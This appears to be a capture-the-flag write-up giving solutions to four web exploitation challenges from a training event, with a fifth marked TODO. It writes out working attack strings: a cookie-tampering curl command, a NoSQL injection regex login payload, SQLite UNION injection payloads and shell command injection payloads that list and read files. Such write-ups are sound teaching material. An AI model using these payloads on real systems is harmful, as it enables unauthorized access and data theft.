# Foresty Hacker Class - Solutions

## List of Challenges
* **Web Exploitation**
  * [Fortune Cookies](#fortune-cookies)
  * [Mongkey](#mongkey)
  * [ezqlite](#ezqlite)
  * [figl33t](#figl33t)
  * [Haiku](#haiku)

## Solutions
### Fortune Cookies
Category: Web Exploitation
Description:
```
Would you like to have some fortune cookies?

http://103.167.136.89:10088/

Author: bleedz#0666 (Discord) / @bl33dz (Tele)
```
Hint:
`https://www.cloudflare.com/learning/privacy/what-are-cookies/`
Solution:
- Visit link given and you will be greeted with a page with a button to get a fortune cookie.
- Inspect the cookies and you will see a cookie named `flag` with a value of `0`.
- Change the value of the cookie to `1` and click the button to get the flag.
- Or, you can use curl to solve this problem.
`curl http://103.167.136.89:10088/ -XPOST --data "submit=" -b 'flag=1' -s | grep ForestyHC`

### Mongkey
Category: Web Exploitation
Description:
```
Can you login as admin?

http://103.167.136.89:10002/

guest:guest

PS: No need to brute force using wordlists

Author: bleedz#0666 (Discord) / @bl33dz (Tele)
```
Hint:
```
Do you know if it is possible to post an array in PHP?

I use MongoDB btw
```
Solution:
- There is a login form with NoSQL Injection vulnerability.
- Enumerate `admin` password using regex.
`username[$eq]=admin&password[$regex]=ForestyHC.*`
- Reference: https://book.hacktricks.xyz/pentesting-web/nosql-injection

Solver:
- [solver_mongkey.py](/solvers/solver_mongkey.py)

### ezqlite
Category: Web Exploitation
Description:
```
It's just a simple website, nothing strange right?

http://103.167.136.89:10031/

Author: bleedz#0666 (Discord) / @bl33dz (Tele)
```
Attachment:
- [app_ezqlite.py](/attachments/app_ezqlite.py)

Solution:
- There is a SQL Injection vulnerability in the `search` parameter.
- Enumerate tables and columns using this payload.
`x%' uNioN seleCt 1,sql,3 from sqlite_master '`
- There is a lot fake flag in the tables, so we need to filter it using `WHERE` clause.
`x%' uNioN seleCt 1,flag,3 from flag_1 where flag not liKe '%fake_flag`
- Try to change table flag_1 to flag_2, flag_3, etc.
- You will get the flag in flag_3 table.
`x%' uNioN seleCt 1,flag,3 from flag_3 where flag not liKe '%fake_flag`

### figl33t
Category: Web Exploitation
Description:
```
My friend really likes ascii art. So I created this website for her.

http://103.167.136.89:10056/

Author: bleedz#0666 (Discord) / @bl33dz (Tele)
```
Attachment:
- [app_figl33t.js](/attachments/app_figl33t.js)

Solution:
- There is a Command Injection vulnerability in the `/figlet` endpoint.
- Use this payload to list all files in the `/` directory.
`'; ls -la /; echo '`
- Then, use this payload to read the flag.
`'; cat /flag*; echo '`

### Haiku
TODO